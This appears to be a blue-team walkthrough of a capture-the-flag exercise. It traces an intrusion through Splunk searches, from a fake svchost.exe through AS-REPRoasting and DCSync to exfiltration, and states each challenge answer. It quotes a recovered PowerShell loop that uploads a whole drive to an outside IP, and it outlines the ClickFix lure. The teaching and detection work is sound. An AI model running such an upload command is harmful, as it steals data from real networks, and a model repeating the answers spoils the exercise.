| makeresults | eval hash=sha256("CHANGEME")

Replace CHANGEME with your answer, then compare the resulting hash with the provided answer hash. For example, if the question was "What is the IP address for Google's DNS?" you would run:

| makeresults | eval hash=sha256("8.8.8.8")

Step 1: Identify Available Log Sources

First, determine what data is available in your Splunk environment:

| tstats count where index=* by index, source

You should see that the relevant data is in the windows index with source WinEventLog:Microsoft-Windows-Sysmon/Operational.

Step 2: Search for Anomalous Process Execution

Use Sysmon Event Code 1 (Process Creation) to identify suspicious processes. This query creates a baseline and highlights outliers:

index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search NOT ComputerName=site-*
| search NOT ("C:\\Users\\*\\selenium-manager.exe" OR "C:\\Windows\\Installer\\MSI*.tmp" OR "C:\\Users\\*\\DismHost.exe")
| stats values(ParentImage) as ParentImages, values(ComputerName) as Computers, values(User) as Users dc(ComputerName) as HostCount, by Image
| eventstats max(HostCount) as MaxHostCount
| eval OutlierScore = round(100 * (HostCount / MaxHostCount), 2)
| where OutlierScore < 15
| sort OutlierScore

Step 3: Analyze the Results

In the results, you should notice a suspicious file: svchost.exe located at C:\Users\carla.rush\Downloads\svchost.exe. This is highly anomalous because:

  • The legitimate svchost.exe is a Windows system file that should only exist in C:\Windows\System32\
  • This binary is located in a user's Downloads folder
  • It's spawning suspicious child processes like net.exe and powershell.exe

Answer: C:\Users\carla.rush\Downloads\svchost.exe

This reveals that the binary was downloaded from daybed.net.

The Answer: ClickFix

This is a ClickFix attack (also sometimes called a "fake CAPTCHA" or "CAPTCHA bypass" attack). In this technique:

  • Victims are directed to a malicious or compromised website (often via phishing)

  • The page instructs them to "verify you're human" by pressing Win+R and pasting a command
  • The command (often using certutil, PowerShell, or other LOLBAS techniques) downloads and executes malware

Step 1: Understanding AS-REPRoasting with Impacket

Research into Impacket reveals that GetNPUsers.py is the tool used for AS-REPRoasting attacks. This script:

  • Sends unauthenticated Kerberos AS-REQ (Authentication Service Request) messages
  • Targets the Domain Controller
  • Operates over port 88 (Kerberos)
  • Identifies accounts that don't require Kerberos pre-authentication

Step 2: Identifying the Communication Pattern

To successfully enumerate vulnerable accounts, the malicious binary needs to:

  • Connect to the Domain Controller
  • Use port 88 (the Kerberos authentication port)
  • Send multiple requests to test different accounts

Step 3: Correlating in the Logs

Use Sysmon Event Code 3 (Network Connection) to identify outbound connections from the malicious binary to port 88:

index=windows ComputerName="br-win10-10.site.lan" Image="C:\\Users\\carla.rush\\Downloads\\svchost.exe" EventCode=3 DestinationPort=88

Step 4: Analyzing the Results

The search reveals 10 total events occurring over approximately 2 seconds. Each network connection event represents an AS-REQ request for a different account. This rapid succession of connections to port 88 is characteristic of automated enumeration.

The Answer: 10 accounts were targeted in the AS-REPRoasting scan.

Detection Insight:

Multiple rapid connections to port 88 from a non-standard process (especially one originating from a user's Downloads folder) is a strong indicator of Kerberos-based attacks like AS-REPRoasting or Kerberoasting.

Step 1: Understanding DCSync Detection

Research reveals that DCSync attacks generate Event Code 4662 (An operation was performed on an object) with specific object type GUIDs:

  • 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
  • 19195a5b-6da0-11d0-afd3-00c04fd930c9 (Domain-DNS class WRITE_DAC)

Step 2: Search for DCSync Indicators

Search for Event Code 4662 with these specific object types:

index=windows EventCode=4662 ("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" OR "19195a5b-6da0-11d0-afd3-00c04fd930c9")

This returns 8 events, with 6 of them occurring at nearly the same time. All 6 events show the object type "Domain-DNS class WRITE_DAC", which is not typical activity. This clustering of events is highly indicative of a DCSync attack.

Step 3: Correlate with Host Activity

Narrow your time frame to ¬±5 minutes around the first DCSync event and examine activity on the infected host:

index=windows ComputerName="br-win10-10.site.lan" 
| stats count by EventCode

Step 4: Identify Process Injection

Event Code 8 (CreateRemoteThread detected) appears approximately one minute before the DCSync. Examining this event reveals that a remote thread was injected into explorer.exe. This is a critical finding - once a process has been injected with a remote thread, any actions originating from that process can no longer be trusted.

Step 5: Connect the Attack Chain

Following the timeline, explorer.exe immediately makes a DNS request to the Domain Controller, which is then followed by the surge in Active Directory object operations (the DCSync itself).

The Answer: explorer.exe was the process used to conduct the DCSync attack (after being compromised via remote thread injection).

Attack Chain Summary:

  1. Malicious binary injects remote thread into explorer.exe (EventCode 8)
  2. Compromised explorer.exe performs DNS lookups to Domain Controller
  3. DCSync operation executes via explorer.exe, replicating AD credentials

Step 1: Search for Exfiltration Activity

Knowing that data may have been exfiltrated, search the proxy logs for POST requests from the infected host:

index=proxy src_ip=172.16.4.110 http_method=POST

Step 2: Analyze Initial Findings

Reviewing the traffic, you'll immediately notice POST requests to daybed.net (the domain identified in earlier exercises) with extremely suspicious-looking URLs containing long encoded strings. However, examining the bytes_in field reveals relatively small data sizes - this doesn't align with actual data exfiltration.

Step 3: Identify the Real Exfiltration Server

Continuing your review of POST requests, you'll find traffic to a hardcoded IP address: 75.170.124.62. Search specifically for this destination:

index=proxy src_ip=172.16.4.110 http_method=POST url="http://75.170.124.62:8443/"

This returns multiple events with significantly larger data volumes: bytes_in=5608837, bytes_in=792826874, etc. These byte counts are consistent with actual data exfiltration.

Step 4: Confirm with Endpoint Logs

To confirm this is indeed exfiltration activity, pivot to the Windows logs:

index=windows "75.170.124.62"

This search returns PowerShell Script Block logs (Event Code 4104) showing the exact command that was executed:

Get-ChildItem "S:\" -File | ForEach-Object { 
    try { 
        (New-Object System.Net.WebClient).UploadFile("http://75.170.124.62:8443", $_.FullName) 
    } catch { 
        Write-Host "Failed: $($_.Name)" 
    } 
}

The Answer: 75.170.124.62

What Happened:

The threat actor successfully uploaded the entire S:\ drive to a server hosted at IP address 75.170.124.62 using PowerShell's WebClient UploadFile method. The large byte counts in the proxy logs confirm substantial data was transmitted.

Important Note: In Squid proxy logs, bytes_in actually represents data going OUT of the network (counterintuitive, but accurate). This is crucial for building effective exfiltration detections.
